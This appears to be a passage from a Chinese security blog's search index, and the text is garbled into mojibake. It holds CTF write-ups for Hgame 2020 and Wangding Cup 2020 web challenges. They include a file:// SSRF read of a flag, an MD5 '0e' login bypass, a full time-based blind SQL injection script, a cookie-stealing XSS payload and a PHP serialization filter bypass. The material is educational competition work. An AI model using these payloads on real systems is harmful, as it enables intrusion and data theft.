$action; } elseif(!isset($_GET[&apos;action&apos;]) || empty($_GET[&apos;action&apos;])) { header(&quot;Location: ?action=login.php&quot;); exit(); }admin.php &lt;?php include &quot;config.php&quot;; session_start(); if(!isset($_SESSION[&apos;username&apos;])) { header(&apos;Location: index.php&apos;); exit(); } function insert_img() { if (isset($_POST[&apos;img_url&apos;])) { $img_url = @$_POST[&apos;img_url&apos;]; $url_array = parse_url($img_url); if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) { return false; } $c = curl_init(); curl_setopt($c, CURLOPT_URL, $img_url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $res = curl_exec($c); curl_close($c); $avatar = base64_encode($res); if(filter_var($img_url, FILTER_VALIDATE_URL)) { return $avatar; } } else { return base64_encode(file_get_contents(&quot;static/logo.png&quot;)); } } ?&gt; &lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;å¯ä»¥çœ‹åˆ°ï¼Œä»index.phpçš„æ–‡ä»¶åŒ…å«æ¥è·å–flagæ˜¯ä¸å¤ªå¯èƒ½äº†ï¼Œåªèƒ½æ‰¾å…¶å®ƒæ–¹æ³•ã€‚åœ¨admin.phpä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªåˆ©ç”¨base64æ¥è¯»å–è¿œç¨‹å’Œæœ¬åœ°å›¾ç‰‡çš„è„šæœ¬ã€‚æˆ–è®¸æˆ‘ä»¬å¯ä»¥å¯¹å…¶è¿›è¡Œåˆ©ç”¨ã€‚ä½†é¦–å…ˆæˆ‘ä»¬éœ€è¦ç”¨ç®¡ç†å‘˜è´¦å·ç™»å½•ä¸Šå»ã€‚éšåä¾¿å¯ä»¥æ‰¾åˆ°ç™»å½•éªŒè¯çš„ä»£ç ï¼š if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username) { $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;]; header(&quot;Location: admin.php&quot;); exit(); } else { echo &quot;??Â¨??Â·???????Ë‰?? ?Ã©??Ã¨Ë‰Ë‰&quot;; }è¿™æ ·ï¼Œæˆ‘ä»¬å°±è¦æƒ³åŠæ³•å¾—åˆ°ä¸¤ä¸ªå˜é‡çš„å€¼$admin_passwordï¼Œadmin_usernameã€‚è¿˜ä¸éš¾æ³¨æ„åˆ°åœ¨login.phpä¸­æœ‰ä¸€ä¸ªdebug-modeï¼Œåªè¦è¾“å…¥å˜é‡ï¼Œä»–å°±ä¼šæ‰§è¡Œeval(â€œvar_dump($$debug);â€);æ¥æ˜¾ç¤ºå˜é‡ã€‚è¿™æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚å¾—åˆ°äº†è´¦å·å’Œmd5åçš„å¯†ç ï¼š username:Cosmos! MD5(password):0e114902927253523756713132279690å¯ä»¥çœ‹åˆ°MD5åçš„å¯†ç æ˜¯0e+æ•°å­—ï¼Œä¸”æ¯”è¾ƒæ—¶ä¹Ÿä¸æ˜¯ä¸¥æ ¼æ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ã€‚ç™»å½•åæ¥åˆ°admin.phpé¡µé¢ï¼Œåˆ†æphpæºç ï¼Œå¾—åˆ°å‡ ä¸ªé‡è¦å‡½æ•°ï¼š filter_var($img_url, FILTER_VALIDATE_URL); //è¿™æ˜¯ä¸€ä¸ªè¿‡æ»¤å™¨å‡½æ•°ï¼Œé€šè¿‡è¿‡æ»¤å™¨æ¥è¿”å›è¿‡æ»¤çš„éƒ¨åˆ†ã€‚ parse_url($img_url); /* è¿™ä¸ªå‡½æ•°æ˜¯å°†ä¸€ä¸ªurlæ‹†è§£ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼Œå¦‚ä¸‹çš„urlä¼šè¢«æ‹†è§£ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼š http://username:password@hostname/path?arg=value#anchor Array ( [scheme] =&gt; http [host] =&gt; hostname [user] =&gt; username [pass] =&gt; password [path] =&gt; /path [query] =&gt; arg=value [fragment] =&gt; anchor ) */åœ¨admin.phpï¼Œä¸­æœ‰è¿™ä¹ˆä¸€æ®µä»£ç  $img_url = @$_POST[&apos;img_url&apos;]; $url_array = parse_url($img_url); ... if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) { return false; } å®ƒæ˜ç¡®è¦æ±‚äº†æ–‡ä»¶çš„hostæ¥è‡ªlocalhostæˆ–timgsa.baidu.comï¼Œå¦åˆ™ä¼šå¯¼è‡´å‡½æ•°è¿”å›falseã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨fileåè®®ä½¿æ¡ä»¶ç¬¦åˆï¼šfile://localhost/flagPSï¼šç†è®ºä¸Šï¼Œfileåè®®ä¹Ÿæ˜¯æœ‰hostéƒ¨åˆ†çš„ï¼Œä½†è¿™ä¸ªåè®®æœ¬èº«å°±æ˜¯è§£ææœ¬åœ°æ–‡ä»¶çš„ï¼Œæ‰€ä»¥è¢«çœç•¥äº†ã€‚ä½†è¿˜æ˜¯éœ€è¦æ³¨æ„hostéƒ¨åˆ†å¿…é¡»æ˜¯localhostï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚PSSï¼šåœ¨æˆ‘windowsæœ¬åœ°ç¯å¢ƒä¸­ä½¿ç”¨ä»¥ä¸‹phpè„šæœ¬ï¼š &lt;?php $url = &apos;file://localhost/D:/114514.txt&apos;; print_r(parse_url($url)); $c = curl_init(); curl_setopt($c, CURLOPT_URL, $url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $res = curl_exec($c); curl_close($c); if(filter_var($url, FILTER_VALIDATE_URL)) { print(&apos;working&apos;); echo $res; } ?&gt; /* Output: Array ( [scheme] =&gt; file [host] =&gt; localhost [path] =&gt; /D:/114514.txt ) working å½“$url=&apos;file:///D:/114514.txt&apos;;æ—¶ Array ( [scheme] =&gt; file [path] =&gt; /D:/114514.txt ) workingã„ã„ã‚ˆï¼ã“ã„ã‚ˆï¼ */ä¸çŸ¥é“ä¸ºä»€ä¹ˆé“¾æ¥è§£ææˆåŠŸäº†ï¼Œä½†æ²¡æœ‰114514.txtçš„æ–‡ä»¶å†…å®¹ã€‚åœ¨5.2.17å’Œ7.3.4çš„ç¯å¢ƒéƒ½è¯•è¿‡äº†ï¼Œéƒ½ä¸è¡Œâ€¦ä½†åœ¨é¢˜ç›®ä¸­ä½¿ç”¨file://localhost/flagæ˜¯å¯ä»¥å¾—åˆ°æ–‡ä»¶å†…å®¹çš„â€¦æ€»ä¹‹å¾—åˆ°äº†flagï¼š hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}Cosmosçš„ç•™è¨€æ¿-1è€ƒå¯Ÿç‚¹sqlæ—¶é—´ç›²æ³¨ï¼ˆæˆ–è®¸ï¼Ÿ è¿‡ç¨‹è¯´æ¥ä¸¢äººï¼Œè¿™é“é¢˜æœ€å¼€å§‹æ‰‹æ³¨äº†å¾ˆé•¿æ—¶é—´ï¼Œä¸€ç›´éƒ½æ²¡æœ‰æˆåŠŸã€‚æ— å¥ˆä¹‹ä¸‹ä½¿ç”¨äº†sqlmapï¼Œå‘ç°å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ã€‚è¿™é“é¢˜è¿‡æ»¤äº†selectå’Œç©ºæ ¼ï¼Œä¸è¿‡ä¸æ˜¯å¤§é—®é¢˜ï¼Œselectå¤§å†™æˆ–åŒå†™ç»•è¿‡ã€ç©ºæ ¼ç”¨/**/ç»•è¿‡ã€‚ä½†è®©æˆ‘è´¹è§£çš„æ˜¯#å’Œ--+è™½ç„¶æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä½†ä¼¼ä¹å¹¶æ²¡æœ‰è¢«sqlè§£æâ€¦ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ä¸è¿‡è¿˜æ˜¯æœ‰åŠæ³•çš„ï¼Œç”¨AND/**/'1å³å¯ã€‚é‚£ä¸å¤šè¯´äº†ï¼Œç›´æ¥ä¸Šè„šæœ¬ï¼š import requests mode = input(&quot;plz input use mode:&quot;) while(True): if(mode == &apos;T&apos;): payload = &apos;1\\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(TABLE_NAME)/**/FROM/**/information_schema.TABLES/**/WHERE/**/TABLE_SCHEMA=database()),%s,1))=%s),sleep(10),1))/**/AND/**/\\&apos;1&apos; break elif(mode == &apos;C&apos;): tab = input(&apos;plz input tables_name:&apos;) payload = &apos;1\\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(COLUMN_NAME)/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\\&apos;1&apos; break elif(mode == &apos;F&apos;): tab = input(&apos;plz input tables_name:&apos;) col = input(&apos;plz input col_name:&apos;) payload = &apos;1\\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/&apos;+ col +&apos;/**/FROM/**/&apos;+ tab +&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\\&apos;1&apos; break elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;): print(&apos;Error&apos;) url = &apos;http://139.199.182.61/index.php?id=&apos; res = &apos;&apos; sel_num = input(&quot;plz input sel_num:&quot;) for i in range(1,int(sel_num)): print(i) for j in range(32,127): now_payload = payload % (i,j) now_url = url + now_payload try: r = requests.get(url=now_url,timeout=4.5) except: res += chr(j) print(res) break print(res) a = input(&quot;æŒ‰ä»»æ„é”®é€€å‡º&quot;) exit() # æŸ¥åˆ°ä¸¤ä¸ªè¡¨ï¼šf1aggggggggggggg,messages # flagè¡¨ä¸­åªæœ‰ä¸€åˆ—ï¼šfl4444444g # å¾—åˆ°flagï¼šhgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}PSï¼šè¿™ä¸ªè„šæœ¬æ˜¯æˆ‘æ ¹æ®swpuctfçš„è„šæœ¬æ”¹ç¼–çš„ï¼Œä¿®æ­£äº†ä¸Šä¸€ä¸ªè„šæœ¬çš„å°é”™è¯¯ï¼ˆé¡ºä¾¿å°å°ä¼˜åŒ–äº†ä¸€ä¸‹ä»£ç ï¼Œé¿å…æ²¡å¿…è¦çš„æ“ä½œã€‚ hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}Cosmosçš„æ–°è¯­è¨€è€ƒå¯Ÿç‚¹è„šæœ¬ç¼–å†™ è¿‡ç¨‹è¿™é“é¢˜å°±æ˜¯å†™è„šæœ¬ï¼Œé¦–å…ˆåœ¨ä¸»é¡µä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸²å˜æ¢çš„å­—ç¬¦ä¸²ï¼Œåœ¨./mycodeä¸­å°±çŸ¥é“è¿™æ˜¯tokenåŠ å¯†åçš„å¯†æ–‡ã€‚åªæœ‰å½“postçš„tokenå’ŒæœåŠ¡å™¨çš„tokenå¯¹åº”å³å¯è·å¾—flagã€‚æ¯”è¾ƒå‘çš„ä¸€ç‚¹æ˜¯ï¼Œåªæœ‰æ·±å…¥å°è¯•åæ‰èƒ½çŸ¥é“è¿™é“é¢˜å˜åŒ–çš„ä¸åªæœ‰tokenï¼Œè¿˜æœ‰åŠ å¯†æ–¹å¼ã€‚8è¯´äº†ï¼Œä¸Šæˆ‘è¾£é¸¡çš„pythonè„šæœ¬ï¼š import base64 import requests import re import codecs catchPasswd = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;).text) # å¾—å¯†æ–‡ catchCrypt = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/mycode&quot;).text) # å¾—åŠ å¯†æ–¹æ³• catchPasswd = re.sub(r&apos;(^.*\\s)(.*\\s)&lt;/span&gt;(.*\\s)&lt;/code&gt;&lt;br&gt;.*\\s&apos;, &quot;&quot;, catchPasswd) catchPasswd = re.sub(r&apos;&lt;br&gt;(.*\\s)(.*\\s)(.*\\s)&lt;/html&gt;&apos;, &quot;&quot;, catchPasswd) # æ­£åˆ™æ¶ˆå»æ— ç”¨éƒ¨åˆ† catchCrypt = re.sub(r&apos;(.*\\s)(.*\\s)(.*\\s)echo\\(&apos;, &quot;&quot;, catchCrypt) catchCrypt = re.sub(r&apos;function(.*\\s)(.*\\s)(.*\\s)(.*\\s)(.*\\s)&apos;, &quot;&quot;, catchCrypt) catchCrypt = re.sub(r&apos;\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\);(.*\\s).*\\s}&apos;, &quot;&quot;, catchCrypt) # ä»¤äººæ™ºç†„çš„æ­£åˆ™ï¼ˆï¼ˆï¼ˆ crypt = catchCrypt.split(&quot;(&quot;, 10) # ä»¥â€˜(â€™ä¸ºç•Œé™ï¼ŒæŠŠå­—ç¬¦ä¸²åˆ†å‰² passwd = catchPasswd def strrev(string): result = &apos;&apos;.join(reversed(string)) return str(result) def decrypt(string): result = &apos;&apos; for i in range(0,len(string)): result += chr(ord(string[i]) - 1) return str(result) def base64_decode(string): result = base64.b64decode(string).decode(&apos;utf-8&apos;) return str(result) def str_rot13(string): result = codecs.getencoder(&quot;rot-13&quot;)(string) return result[0] # å„ä¸ªåŠ å¯†çš„å‡½æ•° for i in range(0, 10): if(crypt[i] == &apos;strrev&apos;): passwd = strrev(passwd) elif(crypt[i] == &apos;str_rot13&apos;): passwd = str_rot13(passwd) elif(crypt[i] == &apos;base64_encode&apos;): passwd = base64_decode(passwd) elif(crypt[i] == &apos;encrypt&apos;): passwd = decrypt(passwd) # è§£å¯†éƒ¨åˆ†ï¼Œå› ä¸ºå›ºå®šåŠ å¯†10æ¬¡ï¼Œæ‰€ä»¥å¾ªç¯åˆ¤æ–­10æ¬¡å³å¯ send = requests.post(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;, data={&apos;token&apos; : passwd }) print(send.text) # æ‰“å°è¾“é€tokenåå¾—åˆ°çš„ç½‘é¡µå¾—åˆ°flagï¼š hgame{5!MPLe-$criPT~WITh_pyThon~OR~PHp}Cosmosçš„èŠå¤©å®¤è€ƒå¯Ÿç‚¹XSSmd5æˆªæ–­éªŒè¯ è¿‡ç¨‹è¿™é“é¢˜çš„è¿‡æ»¤æ–¹å¼å¾ˆæœ‰è¶£ï¼š1.å¾ªç¯è¿‡æ»¤&lt;&gt;ä»¥åŠå…¶ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦2.scriptä¼šå˜ä¸ºHI THERE!3.æ‰€æœ‰çš„å­—ç¬¦å¤§å†™ä¸è¿‡å³ä½¿å¦‚æ­¤ä¹Ÿå¯ä»¥è¿›è¡ŒXSS &lt;img src=1 onerror=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&apos;&lt; &lt;!- å³ï¼š&lt;img src=1 onerror=&apos;alert(1)&apos;&gt; -&gt;1.æ ¹æ®htmlä¸ä¸¥è°¨çš„è¯­æ³•è§„åˆ™ï¼Œå³ä½¿æ²¡æœ‰&gt;å°é—­è¯­å¥ä¹Ÿå¯ä»¥æ­£å¸¸æ˜¾ç¤ºPSï¼šåç«¯çš„pythonä»£ç å¥½åƒè¿˜å¸®å¿™è¡¥å…¨äº†åé¢çš„&lt;ï¼ˆï¼ˆï¼ˆ2.ä½¿ç”¨imgæ ‡ç­¾å’Œonerroräº‹ä»¶æ¥é¿å…ä½¿ç”¨scriptå­—ç¬¦ä¸²3.ä½¿ç”¨å®ä½“ç¼–ç &amp;#(asciiåè¿›åˆ¶);æ¥è§„é¿å­—ç¬¦çš„å¤§å†™è¿™æ ·å°±å¯ä»¥ç›—å–ç®¡ç†å‘˜çš„cookieæ¥æŸ¥çœ‹flagäº†è¿˜æœ‰ï¼Œå…³äºå®ä½“ç¼–ç ç½‘ä¸Šè¿˜æ²¡æœ‰å¯ä»¥ç›´æ¥ç™½å«–çš„ï¼Œè‡ªå·±æ‹¿Cçæ‰“äº†ä¸€ä¸ªï¼ˆæ„Ÿè§‰ç”¨Cæ›´ç®€å•ï¼ˆbiné€‰æ‰‹æ†‹å–·æˆ‘ï¼ˆ #include &lt;stdio.h&gt; int main() { char a=0; while(1) { scanf(&quot;%c&quot;, &amp;a); if(a != 0x0A) printf(&quot;&amp;#%d;&quot;, a); } return 0; }å¦å¤–ï¼Œæƒ³è®©ç®¡ç†botç‚¹å‡»é¡µé¢ï¼Œè¿˜éœ€è¦å‘é€ä¸€æ®µmd5æˆªæ–­éªŒè¯è¿™é‡Œç›´æ¥ç»™ç™½å«–çš„pythonè„šæœ¬ï¼ˆè¿˜æ˜¯å¤šçº¿ç¨‹çš„ï¼š import hashlib from multiprocessing.dummy import Pool as ThreadPool def md5(s): # è®¡ç®—MD5å­—ç¬¦ä¸² return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest() keymd5 = input(&quot;set:&quot;) md5start = 0 md5length = 6 def findmd5(sss): #å·²çŸ¥çš„md5æˆªæ–­å€¼ # è®¾ç½®é¢˜ç›®å·²çŸ¥çš„æˆªæ–­ä½ç½® # è¾“å…¥èŒƒå›´ é‡Œé¢ä¼šè¿›è¡Œmd5æµ‹è¯• key = sss.split(&apos;:&apos;) start = int(key[0]) end = int(key[1]) # å¼€å§‹ä½ç½® # ç»“æŸä½ç½® result = 0 for i in range(start, end): if md5(i)[0:6] == keymd5: result = i print(result) break list=[] # å‚æ•°åˆ—è¡¨ for i in range(10): pool = ThreadPool() # æ‰“å° # æ‹¿åˆ°åŠ å¯†å­—ç¬¦ä¸² # å¤šçº¿ç¨‹çš„æ•°å­—åˆ—è¡¨ å¼€å§‹ä¸ç»“å°¾ list.append(str(100000000*i) + &apos;:&apos; + str(100000000*(i+1))) # å¤šçº¿ç¨‹ä»»åŠ¡ pool.map(findmd5, list) # å‡½æ•° ä¸å‚æ•°åˆ—è¡¨ pool.close() pool.join()å¾—åˆ°tokenï¼šf802788a02a51f9c624bb5d91815bå¾—åˆ°flagï¼š hgame{xsS_1s_r3a11y_inTeresT1ng!!}","link":"/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/"},{"title":"ç½‘é¼æ¯2020-å°çŸ¥è¯†ç‚¹","text":"å‰è¨€åœ¨ç½‘é¼æ¯ä¸­é‡è§äº†è®¸å¤šä»¤äººè¿·æƒ‘çš„é—®é¢˜ã€ä»¥åŠä¸çŸ¥é“çš„çŸ¥è¯†ï¼Œæ•…åœ¨æ­¤è®°å½•ã€‚ phpååºåˆ—åŒ–ä¸­å¯¹è±¡å±æ€§é—®é¢˜åœ¨è¿™æ¬¡çš„ä¸€é“phpååºåˆ—åŒ–çš„ä¸€é“é¢˜ä¸­ã€‚æˆ‘ä»¬è¦åˆ©ç”¨çš„å±æ€§è¢«è®¾ç½®ä¸ºäº†protectedï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å°†ä¼šå‡ºç°%00è¿™ä¸ªä¸å¯è§å­—ç¬¦ï¼Œä½†é¢˜ç›®ä¸­banæ‰äº†æ‰€æœ‰ä¸å¯è§å­—ç¬¦ï¼Œéœ€è¦è¿›è¡Œç»•è¿‡ã€‚ æˆ‘æ­£å½“æƒ³ç€æ€ä¹ˆç»•è¿‡ï¼Œçªç„¶æœ‰å¸ˆå‚…è¯´ä¸å¿…ç†ä¼šé‚£ä¸ª%00ï¼Œåˆ©ç”¨çš„å±æ€§ç›´æ¥æŒ‰ç…§publicå¾—åˆ°çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥è¢«åˆ©ç”¨ã€‚å½“æ—¶çš„æˆ‘ï¼šï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿæˆ‘ä¹‹å‰çš„ä¸€é“ctfä¸­ï¼Œå› ä¸ºæ²¡æœ‰æ³¨æ„åˆ°æŸä¸€ä¸ªå±æ€§çš„å¯è§æ€§æ˜¯privateå¯¼è‡´ç—›å¤±ä¸€é¢˜ã€‚ æ•…åœ¨è¿™é‡Œå°è¯•ä¸åŒç‰ˆæœ¬phpçš„ååºåˆ—åŒ–å¤„ç†å°è¯•ä»¥ä¸‹ä»£ç  &lt;?php echo phpversion().&apos;&lt;br&gt;&apos;; class test { public $a; private $b; protected $c; public function __construct() { $this-&gt;a = 1; $this-&gt;b = 2; $this-&gt;c = 3; } private function outputAll() { echo &apos;a:&apos;.$this-&gt;a.&apos;&lt;br&gt;&apos;; echo &apos;b:&apos;.$this-&gt;b.&apos;&lt;br&gt;&apos;; echo &apos;c:&apos;.$this-&gt;c; } public function __destruct() { $this-&gt;outputAll(); } } if(isset($_GET[&apos;str&apos;])) $obj = unserialize($_GET[&apos;str&apos;]); else { $obj = new test; echo serialize($obj); }ç¯å¢ƒä¸ºlinuxåŠ apache2è®¾ç½®getå‚æ•°ä¸ºstr=O:4:&quot;test&quot;:3:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;s:1:&quot;c&quot;;i:3;}åˆ†åˆ«è·å¾—ä»¥ä¸‹è¾“å‡º php:7.4-apache: 7.4.5&lt;br&gt;a:1&lt;br&gt;b:2&lt;br&gt;c:3 php:7.3-apache: 7.3.17&lt;br&gt;a:1&lt;br&gt;b:2&lt;br&gt;c:3 php:7.2-apache: 7.2.30&lt;br&gt;a:1&lt;br&gt;b:2&lt;br&gt;c:3 php:7.1-apache: 7.1.33&lt;br&gt;a:1&lt;br&gt;b:&lt;br&gt;c: php:7.0-apache: 7.0.33&lt;br&gt;a:1&lt;br&gt;b:&lt;br&gt;c: php:5.6-apache: 5.6.40&lt;br&gt;a:1&lt;br&gt;b:&lt;br&gt;c:å¯ä»¥çœ‹åˆ°ï¼Œåœ¨7.2ä»¥åçš„ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬7.2ï¼‰phpåœ¨è¿›è¡Œååºåˆ—åŒ–å¤„ç†æ—¶å¹¶æ²¡æœ‰å¯¹å±æ€§çš„å¯è§æ€§è¿›è¡Œæ£€éªŒè¿™ä¾¿æ˜¯çŸ›ç›¾çš„æ¥æºï¼Œä¹‹ååœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¸€å®šè¦æ³¨æ„phpçš„ç‰ˆæœ¬ï¼Œè¿™ä¸Šè¿°çš„æƒ…å†µå¯èƒ½ä¼šå¸¦æ¥æ„æƒ³ä¸åˆ°çš„æ¼æ´ã€‚ phpååºåˆ—åŒ–ä¸­çš„Sç±»å‹åœ¨ä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æœ‰ç‰¹æ®Šçš„å«æ„O:4:&quot;test&quot;:3:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;s:1:&quot;c&quot;;i:3;}åœ¨ä¸Šé¢çš„å­—ç¬¦ä¸²ä¸­ï¼ŒOä¸ºå¯¹è±¡ã€sä¸ºå­—ç¬¦ä¸²ã€iä¸ºæ•°å­—â€¦è¿™é‡Œè¦è®²ä¸€ç§Sç±»å‹ï¼ŒSç±»å‹æŒ‡çš„æ˜¯æ˜¯å·²ç»è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²åœ¨ä¸€ä¸ªprivateæˆ–protectedçš„å¯¹è±¡å±æ€§ä¸­ï¼Œåºåˆ—åŒ–åï¼Œä¼šæœ‰ç‰¹æ®Šçš„å­—ç¬¦ ä»¥ä¸Šé¢çš„ä»£ç ä¸ºä¾‹ï¼ˆPSï¼š%00ä¸ºhexå€¼ä¸º00çš„å­—ç¬¦ï¼‰åºåˆ—åŒ–bä¸ºï¼šs:7:&quot;%00test%00b&quot;;i:2;åºåˆ—åŒ–cä¸ºï¼šs:4:&quot;%00*%00c&quot;;i:3;å¯ä»¥çœ‹åˆ°ï¼Œå½“åœ¨æµè§ˆå™¨è¿™ä¹ˆè¾“å…¥åï¼Œä¼šå‘æœåŠ¡å™¨å‘é€ä¸å¯è§å­—ç¬¦ã€‚ ä½†å¯¹äºSç±»å‹åˆ™æ²¡æœ‰å¿…è¦äº†ï¼Œå°†sæ›¿æ¢ä¸ºSåï¼šåºåˆ—åŒ–bä¸ºï¼šS:7:&quot;\\00test\\00b&quot;;i:2;åºåˆ—åŒ–cä¸ºï¼šS:4:&quot;\\00*\\00c&quot;;i:3;è¿™æ ·ä¼ å…¥çš„æ˜¯3ä¸ªå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²\\00è€Œä¸æ˜¯00è¿™ä¸ªä¸å¯è§å­—ç¬¦ è¿™ä¹ˆåšçš„ç›®çš„å…¶å®åœ¨è¿™æ¬¡çš„CTFä¾¿å¯ä»¥è§å¾—ã€‚æœ‰æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¼šBANæ‰ä¸å¯è§çš„å­—ç¬¦ï¼Œé˜²æ­¢è¿™äº›å­—ç¬¦å¯¼è‡´ç³»ç»Ÿé”™è¯¯ã€‚ä½†å¯¹äºphpçš„ååºåˆ—åŒ–å­—ç¬¦ä¸²æ¥è¯´ï¼ŒSç±»å‹æ°å¥½ç»•è¿‡äº†è¿™ä¸ªé™åˆ¶ã€‚ åè¨€ç›®å‰å°±å­¦åˆ°è¿™ä¹ˆå¤šï¼ˆï¼Œä¹‹åé å¤ç°æ¥å­¦ä¹ å§ã€‚å½“æ—¶javaçš„xxeè¯•äº†åŠå¤©æ²¡æœ‰å‡ºç½‘ï¼Œè¿˜ä»¥ä¸ºpayloadçš„é”…ï¼Œç»“æœå¤ç°å‘ç°ä¸€æ¨¡ä¸€æ ·çš„payloadï¼Œbuuojå¯ä»¥å‡ºç½‘ï¼ˆæŒ‡é¶æœºå†…ç½‘ï¼‰ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆè„‘å£³ç—›ï¼ˆè¿˜æœ‰å°±æ˜¯åæ§½ä¸€ä¸‹é‚£ä¸ª/webé‚£ä¸ªç›®å½•æœ‰ç‚¹å‘ï¼ˆä»¥åå…ˆå°è¯•å»è¯»ä¸€ä¸‹httpd.confPSï¼šphpçœŸæ˜¯åšå¤§ç²¾æ·±ï¼ˆï¼ˆï¼ˆ","link":"/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"},{"title":"Hello World!!!","text":"æ‚¨å¥½ï¼æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢ï¼","link":"/2020/02/24/Hello-World-0/"},{"title":"jsçš„ç»§æ‰¿ä¸åŸå‹é“¾æ±¡æŸ“","text":"å‰è¨€è¿·è¿·ç³Šç³Šç»ˆäºææ‡‚äº†jsçš„é¢å‘å¯¹è±¡ï¼ˆå¤§æ¦‚ï¼‰ï¼Œè¿™é‡Œç®€å•è®°ä¸ªç¬”è®°ã€‚ javasciptä¸­çš„ç±»ä¼—æ‰€å‘¨çŸ¥ï¼Œjavascriptè™½ç„¶å¯ä»¥è¿›è¡Œé¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œä½†å…¶æœ¬èº«æ˜¯æ²¡æœ‰classè¿™ä¸€æ¦‚å¿µçš„ã€‚javascriptä½¿ç”¨functionæ¥å®ç°classè¿™ä¸€æ¦‚å¿µã€‚ 123456function o1() { this.test = \"aaa\";}let a = new o1;console.log(a.test); //aaa å³ä½¿æ˜¯æœ‰classè¿™ä¸€å…³é”®è¯ï¼Œä¹Ÿåªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼Œå…¶æœ¬è´¨è¿˜æ˜¯function 1234567class o1 { constructor() { this.test = \"aaa\"; }};console.log(typeof o1); //function ç»§æ‰¿jsçš„ç»§æ‰¿æœ‰å¤šç§æ–¹æ³•å®ç°ï¼Œè¿™é‡Œåªä»‹ç»ç»„åˆç»§æ‰¿ åŸå‹é“¾å¯¹äºä¸€ä¸ªç±»ï¼Œå®ƒæœ‰è‡ªå·±çš„åŸå‹å¯¹è±¡Class.prototypeï¼Œé€šè¿‡prototypeå…³é”®å­—è®¿é—®å¯¹äºä¸€ä¸ªç±»çš„å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰ï¼Œå®ƒå¯ä»¥é€šè¿‡__proto__å…³é”®è¯è®¿é—®å¯¹åº”çš„åŸå‹å¯¹è±¡è€Œå…³é”®è¯constructoræ˜¯ä¸Šé¢ä¸¤ä¸ªçš„é€†è¿‡ç¨‹ä¸€ä¸ªåŸå‹å¯¹è±¡ä¹Ÿå¯ä»¥é€šè¿‡__proto__è®¿é—®çˆ¶çº§åŸå‹å¯¹è±¡æ€»ç»“ï¼šprototype ç±»çš„å…³é”®è¯ï¼Œè®¿é—®å¯¹åº”åŸå‹å¯¹è±¡__proto__ å¯¹è±¡çš„å…³é”®è¯ï¼Œè®¿é—®å¯¹åº”åŸå‹å¯¹è±¡constructor å¯¹è±¡çš„å…³é”®è¯ï¼Œè®¿é—®å¯¹åº”çš„ç±» ä¸‹ä¾‹æ˜¯ä¸€ä¸ªç»§æ‰¿é“¾å’Œæ„é€ å‡½æ•°çš„ç»„åˆç»§æ‰¿ 12345678910111213141516function o1(id) { this.id = id;};o1.prototype.sayId = function() { console.log(this.id);}function o2(id, name) { o1.call(this, id); this.name = name;}o2.prototype = new o1();o2.prototype.sayName = function() { console.log(this.name);}o2.prototype.constructor = o2; o2.prototype.constructor = o2 